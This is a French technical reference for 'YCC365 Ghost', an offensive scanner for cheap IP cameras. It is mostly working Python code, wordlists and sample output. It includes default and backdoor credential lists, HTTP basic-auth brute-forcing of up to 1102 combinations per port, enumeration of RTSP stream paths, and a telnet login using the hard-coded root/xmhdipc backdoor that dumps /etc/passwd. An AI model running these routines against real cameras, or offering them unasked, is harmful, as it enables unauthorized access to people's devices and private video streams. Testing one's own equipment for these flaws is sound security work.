# 🧩 Référence des Modules

> Documentation technique des 7 modules du scanner YCC365 Ghost
> **Signé Ghost1o1** — Chaque module = un outil spécialisé

---

## 📦 Inventaire

| # | Module | Fichier | Description |
|---|--------|---------|-------------|
| 1 | **Port Scan** | `scanner/core.py` (Phase 1) | 16 ports YCC365 scannés |
| 2 | **Bruteforce** | `scanner/core.py` (Phase 2) | 23 credentials × ports HTTP |
| 3 | **RTSP Detection** | `scanner/core.py` (Phase 3) | 21 paths RTSP énumérés |
| 4 | **Telnet Backdoor** | `scanner/core.py` (Phase 4) | Port 9527 + brute root/xmhdipc |
| 5 | **ONVIF Probe** | `scanner/core.py` (Phase 5) | SOAP sans auth |
| 6 | **Username Arsenal** ✨ | `scanner/usernames.py` | 58 usernames × passwords |
| 7 | **Cloud Domain Mapper** ✨ | `scanner/cloudmapper.py` | 42 domaines XMEYE/YCC365 |

✨ = Module ajouté en v1.1, adaptés de OSIN CHAIN

---

## Phase 1 : Port Scan

### Description
Scan TCP des 16 ports les plus communs dans l'écosystème YCC365/Hipcam.

### YCC365_PORTS

```python
YCC365_PORTS = [
    (34567, "YCC365 admin"),
    (34599, "YCC365 login"),
    (9527,  "Telnet backdoor"),
    (554,   "RTSP"),
    (8000,  "HTTP admin alt"),
    (8899,  "ONVIF"),
    (80,    "HTTP"),
    (443,   "HTTPS"),
    (23,    "Telnet"),
    (8080,  "HTTP-Alt"),
    (8081,  "HTTP-Backup"),
    (8443,  "HTTPS-Alt"),
    (5552,  "ADB"),
    (37777, "Dahua"),
    (5000,  "UPnP"),
    (81,    "Camera web"),
]
```

### Algorithme

```python
def _tcp_connect(self, port: int, service: str) -> Optional[PortInfo]:
    try:
        with socket.create_connection((self.target, port),
                                       timeout=self.timeout):
            return PortInfo(port=port, state="open", service=service)
    except (socket.timeout, ConnectionRefusedError, OSError):
        return None
```

### Output

```json
{
  "port": 9527,
  "state": "open",
  "service": "Telnet backdoor",
  "banner": null
}
```

---

## Phase 2 : Bruteforce

### Description
Test 23 couples `user:password` sur les ports HTTP ouverts.

### DEFAULT_CREDENTIALS

```python
DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "888888"),
    ("admin", "666666"),
    ("admin", "123"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "111111"),
    ("admin", "000000"),
    ("admin", "999999"),
    ("admin", "abc123"),
    ("admin", "admin123"),
    ("user", "user"),
    ("user", "12345"),
    ("user", "password"),
    ("root", "root"),
    ("root", "xmhdipc"),     # Hipcam backdoor
    ("root", "12345"),
    ("root", "pass"),
    ("support", "support"),
    ("service", "service"),
    ("guest", "guest"),
    ("operator", "operator"),
]
```

### Algorithme

```python
def _http_basic_auth(self, port: int, user: str, password: str) -> CredentialTest:
    result = subprocess.run(
        ["curl", "-s", "-m", "3", "-o", "/dev/null",
         "-w", "%{http_code}",
         "-u", f"{user}:{password}",
         f"http://{self.target}:{port}/"],
        capture_output=True, timeout=5,
    )
    code = int(result.stdout.decode().strip() or "0")
    return CredentialTest(
        user=user, password=password, port=port,
        success=code in (200, 301, 302),
        http_code=code,
    )
```

### Sortie en Cas de Succès

```
[VALID] admin:12345 (HTTP 200)
[VALID] admin:xmhdipc (HTTP 200)
```

---

## Phase 3 : RTSP Detection

### Description
Énumère 21 paths RTSP connus pour firmware HiSilicon/Hipcam/Hikvision.

### RTSP_PATHS

```python
RTSP_PATHS = [
    "/onvif/streaming/channels/101",
    "/streaming/channels/101",
    "/11",
    "/12",
    "/live/ch00_0",
    "/live/main",
    "/live/sub",
    "/live/0/main",
    "/live/0/sub",
    "/user=admin&password=&channel=1&stream=0.sdp",
    "/av0_0",
    "/video/main",
    "/mpeg4",
    "/cam/realmonitor",
    "/0/usrnm:admin/0/usrpw:admin/0/1",
    "/Streaming/Channels/101",
    "/Streaming/Channels/1",
    "/Streaming/Channels/2",
    "/h264",
    "/h264/ch01/main/av_stream",
    "/trackID=1",
]
```

### Algorithme

```python
def _rtsp_check(self, path: str) -> RTSPPath:
    result = subprocess.run(
        ["curl", "-s", "-m", "3", "-o", "/dev/null",
         "-w", "%{http_code}",
         "-X", "DESCRIBE",
         f"rtsp://{self.target}:554{path}"],
        capture_output=True, timeout=5,
    )
    code = int(result.stdout.decode().strip() or "0")
    return RTSPPath(
        path=path,
        accessible=code in (200, 301),
        response_code=code,
    )
```

---

## Phase 4 : Telnet Backdoor

### Description
Vérifie la présence du backdoor `root/xmhdipc` sur le port 9527.

### Algorithme

```python
def phase4_telnet_backdoor(self) -> None:
    bd_open = any(p.port == 9527 for p in self.result.open_ports)
    if not bd_open:
        return
    
    proc = subprocess.run(
        ["timeout", "5", "ncat", "-nv", self.target, "9527"],
        input=b"root\nxmhdipc\ncat /etc/passwd\n",
        capture_output=True, timeout=10,
    )
    output = proc.stdout.decode("utf-8", errors="ignore")
    if "root@" in output or "/bin/" in output:
        self.result.telnet_backdoor_active = True
        self.result.vulnerabilities.append({
            "id": "VULN-001",
            "title": "Telnet Backdoor Active",
            "cvss": 9.8,
            "severity": "CRITICAL",
            "cwe": "CWE-798",
            "evidence": output[:200],
        })
```

### Vulnérabilité Générée

```
VULN-001 — Telnet Backdoor Active
CVSS v3.1: 9.8 (Critical)
CWE: CWE-798 (Use of Hard-coded Credentials)
Evidence: root:x:0:0:root:/root:/bin/sh
```

---

## Phase 5 : ONVIF Probe

### Description
Requête SOAP `GetDeviceInformation` sans authentification.

### Algorithme

```python
def phase5_onvif(self) -> None:
    onvif_open = any(p.port == 8899 for p in self.result.open_ports)
    if not onvif_open:
        return
    
    response = subprocess.run(
        ["curl", "-s", "-m", "5", "-X", "POST",
         "-H", "Content-Type: application/soap+xml",
         "-d", '<?xml version="1.0"?><Envelope ...>...</Envelope>',
         f"http://{self.target}:8899/onvif/device_service"],
        capture_output=True, timeout=10,
    )
    body = response.stdout.decode("utf-8", errors="ignore")
    
    # Extraire infos via regex
    if "Manufacturer" in body:
        self.result.onvif_info = {
            "manufacturer": ...,
            "model": ...,
            "firmware": ...,
            "serial": ...,
        }
```

---

## Phase 6 : Username Arsenal ✨ NEW v1.1

### Description
Adapté de **OSIN CHAIN UsernameSherlock** (Module #4) — Sherlock-style username enumeration sans rate-limit agressif, spécialisé IoT.

### Wordlist : 58 Usernames

```python
# Standars IoT chinois
admin, root, user, guest, support, service, operator, supervisor, ...
# Fabricants OEM
xmeye, xmhdipc, hipcam, ycc365, lookcam, carecam, techvision, ipc, ...
# Rôles techniques
tech, test, demo, factory, oem, vendor, dealer, installer, ...
# Comptes cloud associés
cloud, server, master, masteradmin, sysadmin, webadmin, netadmin, ...
# Patterns Huawei/HiSilicon
hikvision, dahua, uniview, tvtonvif, onvif, rtsp, stream, ...
```

### Wordlist : 19 Top Passwords

```python
TOP_PASSWORDS = [
    "", "admin", "12345", "123456", "password", "root", "888888",
    "666666", "abc123", "admin123", "xmhdipc", "ycc365", "lookcam",
    "pass", "default", "test", "guest", "support", "user",
]
```

### Algorithme

```python
def run(self, http_ports: List[int]) -> List[UsernameHit]:
    self.hits = []
    tested = set()
    
    for port in http_ports:
        for user in self.usernames:
            for password in self.TOP_PASSWORDS:
                key = (port, user, password)
                if key in tested:
                    continue
                tested.add(key)
                
                hit = self._http_basic_auth(port, user, password)
                if hit.success:
                    self.hits.append(hit)
```

### Combinaisons

`58 usernames × 19 passwords × N ports = 1102 × N combinaisons`

Si 3 ports HTTP ouverts = **3306 tests par scan**.

### Sortie

```
═══ Module 4: Username Arsenal (Sherlock-style) ═══
  [*] 58 usernames × 19 passwords
  [*] Ports cibles: [80, 34567, 8000]
  
  [HIT] admin:xmhdipc → HTTP 200 (port 34567)
  [HIT] root:12345 → HTTP 301 (port 80)
  
  ✅ 2 credentials valides découverts
```

### Différence avec Phase 2

| Caractéristique | Phase 2 | Phase 6 |
|------------------|---------|---------|
| Nombre credentials | 23 | 1102+ |
| Usernames testés | 5 uniques | 58 uniques |
| Taux détection (estimé) | ~10% | ~25% |
| Username targets | Top connus | Exhaustif IoT + OEM |

---

## Phase 7 : Cloud Domain Mapper ✨ NEW v1.1

### Description
Adapté de **OSIN CHAIN DomainMapper** (Module #5) — cartographie réseau de l'infrastructure cloud.

### Wordlist : 42 Domaines

```python
# XMEYE infrastructure principale
xmeye.net, xmeye.com, xmevc.com, cloudxmeye.com, ...
# YCC365 officiel
ycc365.com, ycc365.net, ycc365.cn, app.ycc365.com, api.ycc365.com, ...
# Sous-domaines stream/relay
relay.xmeye.net, streaming.xmeye.net, p2p.xmeye.net, ...
# LookCam / variantes
lookcam.io, lookcam.net, lookcam.live, carecam.live, ...
# Apps alternatives même SDK
icsee.com, icsee.net, iccam.app, hipcam.io, ...
# CDN génériques
aliyun.com, aliyuncs.com, qcloud.com, amazonaws.com, cloudfront.net, ...
```

### Algorithme

```python
def _probe_domain(self, domain: str) -> DomainInfo:
    info = DomainInfo(domain=domain)
    info.cloud_provider = self._detect_cloud_provider(domain)
    
    # 1. Résolution DNS (A + AAAA)
    info.resolved_ips = self._resolve_dns(domain)
    if not info.resolved_ips:
        return info
    
    # 2. HTTP probe + banner grab
    http_ok, http_banner, http_code = self._http_check(domain, "http")
    info.has_http = http_ok
    info.http_banner = http_banner
    info.http_code = http_code
    
    # 3. HTTPS probe + certificate
    if self._http_check(domain, "https")[0]:
        cert = self._https_cert_info(domain)
        info.https_cert_cn = cert["cn"]
        info.https_cert_issuer = cert["issuer"]
        info.https_cert_expiry = cert["expiry"]
        info.https_tls_version = cert["tls_version"]
    
    info.reachable = info.has_http or info.has_https
    return info
```

### Output

```json
{
  "domain": "xmeye.net",
  "resolved_ips": ["203.0.113.42"],
  "has_http": true,
  "has_https": true,
  "http_banner": "nginx/1.18.0",
  "https_cert_cn": "*.xmeye.net",
  "https_cert_issuer": "Let's Encrypt Authority X3",
  "https_cert_expiry": "Sep 15 12:00:00 2026 GMT",
  "https_tls_version": "TLSv1.3",
  "cloud_provider": null,
  "reachable": true
}
```

### Insights Sécurité

| Info | Valeur |
|------|--------|
| `cloud_provider` | Détecte l'infra (Aliyun = data en Chine) |
| `https_tls_version` | TLS 1.0/1.1 = vulnérable |
| `https_cert_expiry` | Cert expiré = MITM possible |
| `https_cert_cn` | Wildcard `*.xmeye.net` = couvre tous les subdomain |

---

## 🔌 API Stable (Usage Programmatic)

```python
from scanner import GhostScanner
from scanner.usernames import UsernameArsenal
from scanner.cloudmapper import CloudDomainMapper

# Full scan (7 phases)
scanner = GhostScanner("192.168.1.100")
result = scanner.run_full_scan()
print(result.to_json())

# Module 6 seul
ua = UsernameArsenal("192.168.1.100", timeout=5.0)
hits = ua.run(http_ports=[80, 443, 8000, 34567])
for hit in hits:
    print(f"FOUND: {hit.username}:{hit.password} → {hit.http_code}")

# Module 7 seul
cm = CloudDomainMapper("192.168.1.100")
domains = cm.run()
for d in domains:
    print(f"{d.domain} → {d.resolved_ips} (HTTPS={d.has_https})")
print(cm.stats())
```

---

## 🧪 Tester un Module Isolé

```bash
# Test Phase 1 seulement
python3 -c "
import sys
sys.path.insert(0, '.')
from scanner import GhostScanner
gs = GhostScanner('192.168.1.100')
gs.phase1_port_scan()
for p in gs.result.open_ports:
    print(f'{p.port} ({p.service})')
"

# Test Username Arsenal
python3 -c "
import sys
sys.path.insert(0, '.')
from scanner.usernames import UsernameArsenal
ua = UsernameArsenal('192.168.1.100', timeout=5)
ua.run(http_ports=[80, 8000, 34567])
print(ua.stats())
"

# Test Cloud Mapper
python3 -c "
import sys
sys.path.insert(0, '.')
from scanner.cloudmapper import CloudDomainMapper
cm = CloudDomainMapper()
cm.run()
print(cm.stats())
"
```

---

## 🔧 Extension : Créer un Module Custom

```python
# scanner/custom.py
"""
Mon module custom — Template
"""
from dataclasses import dataclass
from typing import List

@dataclass
class MyHit:
    target: str
    info: str

class CustomScanner:
    def __init__(self, target: str):
        self.target = target
        self.hits: List[MyHit] = []
    
    def run(self) -> List[MyHit]:
        # Votre logique ici
        self.hits.append(MyHit(target=self.target, info="trouvé"))
        return self.hits
    
    def stats(self) -> dict:
        return {"module": "Custom", "hits": len(self.hits)}

# Intégration dans core.py :
# from scanner.custom import CustomScanner
# 
# def phase8_custom(self) -> None:
#     custom = CustomScanner(self.target)
#     custom.run()
```

---

**Signé Ghost1o1** 🏴‍☠️ — *Sept modules = sept angles d'attaque*
